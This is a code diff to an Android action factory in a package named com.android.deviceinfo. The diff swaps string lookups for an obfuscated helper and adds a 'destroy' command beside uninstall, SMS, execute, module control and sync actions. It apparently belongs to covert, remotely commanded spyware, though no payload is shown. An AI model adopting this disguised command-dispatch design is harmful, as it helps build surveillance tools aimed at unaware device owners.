@@ -9,13 +9,13 @@ package com.android.deviceinfo.action;
 
 import org.json.JSONException;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.Trigger;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfAction;
 import com.android.deviceinfo.conf.ConfigurationException;
 import com.android.deviceinfo.util.Check;
+import com.android.m.M;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -49,7 +49,7 @@ public abstract class SubAction {
 		this.status = Status.self();
 		this.conf = conf;
 
-		stop = conf.getBoolean(Messages.getString("S_15"), false); //$NON-NLS-1$        
+		stop = conf.getBoolean(M.e("stop"), false); //$NON-NLS-1$        
 
 		parse(conf);
 	}
@@ -72,28 +72,28 @@ public abstract class SubAction {
 			Check.asserts(type != null, "factory: null type"); //$NON-NLS-1$
 
 		// TODO: messages file
-		if (type.equals(Messages.getString("S_1"))) { //$NON-NLS-1$
+		if (type.equals(M.e("uninstall"))) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Factory *** ACTION_UNINSTALL ***");//$NON-NLS-1$
 			}
 			
 			return new UninstallAction(params);
-		} else if (type.equals(Messages.getString("S_2"))) { //$NON-NLS-1$
+		} else if (type.equals(M.e("sms"))) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Factory *** ACTION_SMS ***");//$NON-NLS-1$
 			}
 			
 			return new SmsAction(params);
-		} else if (type.equals(Messages.getString("S_3"))) { //$NON-NLS-1$
-			String status = params.getString(Messages.getString("S_4")); //$NON-NLS-1$
-			if (status.equals(Messages.getString("S_5"))) { //$NON-NLS-1$
+		} else if (type.equals(M.e("module"))) { //$NON-NLS-1$
+			String status = params.getString(M.e("status")); //$NON-NLS-1$
+			if (status.equals(M.e("start"))) { //$NON-NLS-1$
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Factory *** ACTION_START_MODULE ***");//$NON-NLS-1$
 					Check.log(TAG + " params: " + params );
 				}
 				
 				return new StartModuleAction(params);
-			} else if (status.equals(Messages.getString("S_6"))) { //$NON-NLS-1$
+			} else if (status.equals(M.e("stop"))) { //$NON-NLS-1$
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Factory *** ACTION_STOP_MODULE ***");//$NON-NLS-1$
@@ -101,15 +101,15 @@ public abstract class SubAction {
 				
 				return new StopModuleAction(params);
 			}
-		} else if (type.equals(Messages.getString("S_7"))) { //$NON-NLS-1$
-			String status = params.getString(Messages.getString("S_8")); //$NON-NLS-1$
-			if (status.equals(Messages.getString("S_9"))) { //$NON-NLS-1$
+		} else if (type.equals(M.e("event"))) { //$NON-NLS-1$
+			String status = params.getString(M.e("status")); //$NON-NLS-1$
+			if (status.equals(M.e("enable"))) { //$NON-NLS-1$
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Factory *** ACTION_ENABLE_EVENT ***");//$NON-NLS-1$
 				}
 				
 				return new EnableEventAction(params);
-			} else if (status.equals(Messages.getString("S_10"))) { //$NON-NLS-1$
+			} else if (status.equals(M.e("disable"))) { //$NON-NLS-1$
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Factory *** ACTION_DISABLE_EVENT ***");//$NON-NLS-1$
 				}
@@ -117,8 +117,8 @@ public abstract class SubAction {
 				return new DisableEventAction(params);
 
 			}
-		} else if (type.equals(Messages.getString("S_11"))) { //$NON-NLS-1$
-			boolean apn = params.has(Messages.getString("S_12")); //$NON-NLS-1$
+		} else if (type.equals(M.e("synchronize"))) { //$NON-NLS-1$
+			boolean apn = params.has(M.e("apn")); //$NON-NLS-1$
 			
 			if (apn) {
 				if (Cfg.DEBUG) {
@@ -134,19 +134,25 @@ public abstract class SubAction {
 				return new SyncActionInternet(params);
 			}
 
-		} else if (type.equals(Messages.getString("S_13"))) { //$NON-NLS-1$
+		} else if (type.equals(M.e("execute"))) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Factory *** ACTION_EXECUTE ***");//$NON-NLS-1$
 			}
 			
 			return new ExecuteAction(params);
 
-		} else if (type.equals(Messages.getString("S_14"))) { //$NON-NLS-1$
+		} else if (type.equals(M.e("log"))) { //$NON-NLS-1$
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Factory *** ACTION_INFO ***");//$NON-NLS-1$
 			}
 			
 			return new LogAction(params);
+		} else if (type.equals(M.e("destroy"))) { //$NON-NLS-1$
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Factory *** ACTION_DESTROY ***");//$NON-NLS-1$
+			}
+			
+			return new DestroyAction(params);
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (factory) Error: unknown type: " + type); //$NON-NLS-1$
